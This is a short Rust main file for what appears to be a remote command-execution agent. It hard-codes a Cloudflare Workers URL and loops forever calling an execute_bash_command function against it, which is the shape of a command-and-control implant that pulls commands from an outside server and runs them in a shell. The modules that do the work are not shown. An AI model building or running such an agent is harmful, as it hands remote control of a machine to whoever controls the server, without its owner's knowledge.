mod command_executor;  
mod worker_communication;  
  
#[tokio::main]  
async fn main() {  
    let worker_url = "https://serverworker.adoba.workers.dev/";  
  
    loop {  
        let _ = command_executor::execute_bash_command(true, &worker_url).await;  
    }  
}  
